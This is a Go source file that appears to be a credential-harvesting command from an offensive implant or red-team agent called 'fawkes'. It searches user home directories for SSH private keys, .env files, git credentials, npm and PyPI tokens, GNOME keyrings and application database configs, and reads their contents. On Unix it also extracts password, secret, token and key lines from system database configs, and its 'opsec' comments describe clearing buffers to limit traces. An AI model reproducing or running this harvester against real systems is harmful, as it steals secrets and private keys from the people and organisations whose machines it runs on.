package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// Application config patterns — cross-platform
var configPatterns = []struct {
	name     string
	patterns []string
}{
	{"Environment Files", []string{".env", ".env.local", ".env.production"}},
	{"SSH Private Keys", []string{
		".ssh/id_rsa", ".ssh/id_ecdsa", ".ssh/id_ed25519", ".ssh/id_dsa",
	}},
	{"Git Credentials", []string{
		".git-credentials",
		".gitconfig",
	}},
	{"NPM/Pip/Gem Tokens", []string{
		".npmrc",
		".pypirc",
		".gem/credentials",
	}},
}

func credConfigs(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Application Credentials & Configs\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	// Common cross-platform patterns
	allPatterns := configPatterns

	// Add platform-specific patterns
	if runtime.GOOS != "windows" {
		allPatterns = append(allPatterns, struct {
			name     string
			patterns []string
		}{
			"GNOME Keyring", []string{
				".local/share/keyrings/login.keyring",
				".local/share/keyrings/user.keyring",
				".local/share/keyrings/default.keyring",
			},
		})
	}

	// Database config files
	allPatterns = append(allPatterns, struct {
		name     string
		patterns []string
	}{
		"Database Configs", []string{
			"config/database.yml",
			"wp-config.php",
			"settings.py",
			"application.properties",
			"appsettings.json",
			"config.json",
		},
	})

	for _, cfg := range allPatterns {
		sb.WriteString(fmt.Sprintf("--- %s ---\n", cfg.name))
		found := false

		for _, home := range homes {
			for _, pattern := range cfg.patterns {
				path := filepath.Join(home, pattern)
				info, err := os.Stat(path)
				if err != nil {
					continue
				}
				found = true
				sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", path, info.Size()))

				if info.Size() < 4096 && info.Size() > 0 {
					if data, err := os.ReadFile(path); err == nil {
						content := string(data)
						structs.ZeroBytes(data) // opsec: clear raw config file data
						if len(content) > 1000 {
							content = content[:1000] + "\n... (truncated)"
						}
						sb.WriteString(fmt.Sprintf("  Content:\n%s\n", credIndentLines(content, "    ")))
					}
				}
			}
		}

		// System-level database configs (Unix only)
		if cfg.name == "Database Configs" && runtime.GOOS != "windows" {
			systemPaths := []string{
				"/etc/mysql/debian.cnf",
				"/etc/postgresql/*/main/pg_hba.conf",
				"/var/lib/mysql/.my.cnf",
				"/etc/redis/redis.conf",
				"/etc/mongod.conf",
			}
			for _, pattern := range systemPaths {
				matches, _ := filepath.Glob(pattern)
				for _, path := range matches {
					info, err := os.Stat(path)
					if err != nil {
						continue
					}
					found = true
					sb.WriteString(fmt.Sprintf("  [SYSTEM] %s (%d bytes)\n", path, info.Size()))
					if info.Size() < 4096 && info.Size() > 0 {
						if data, err := os.ReadFile(path); err == nil {
							lines := strings.Split(string(data), "\n")
							structs.ZeroBytes(data) // opsec: clear raw database config data
							for _, line := range lines {
								lower := strings.ToLower(line)
								if strings.Contains(lower, "password") || strings.Contains(lower, "secret") || strings.Contains(lower, "token") || strings.Contains(lower, "key") {
									sb.WriteString(fmt.Sprintf("    %s\n", strings.TrimSpace(line)))
								}
							}
						}
					}
				}
			}
		}

		if !found {
			sb.WriteString("  (not found)\n")
		}
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}
